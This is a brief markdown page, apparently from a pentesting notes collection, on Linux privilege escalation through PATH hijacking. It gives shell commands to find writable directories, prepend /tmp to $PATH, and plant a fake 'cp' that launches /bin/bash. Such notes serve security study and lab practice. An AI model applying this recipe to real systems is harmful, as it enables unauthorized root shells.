# PATH

we start to know all paths are stored

![image.png](<../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

then we want to know what are folder is writable

```bash
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```

we compare if any writable folder is path or not if not found we try to add this folder in `$PATH`

```bash
export PATH=/tmp:$PATH
# replace /tmp to your path
```

then we will create a malicious file

```bash
echo -e '#!/bin/bash\n/bin/bash' > /tmp/cp
chmod +x /tmp/cp
```
